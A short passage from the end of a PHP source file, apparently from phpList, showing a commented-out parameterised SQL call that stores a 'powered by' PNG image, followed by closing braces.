    Sql_Query_Params($query, array('image/png', 'powerphplist.png', $newpoweredimage, 70, 30));
    }
    */

} 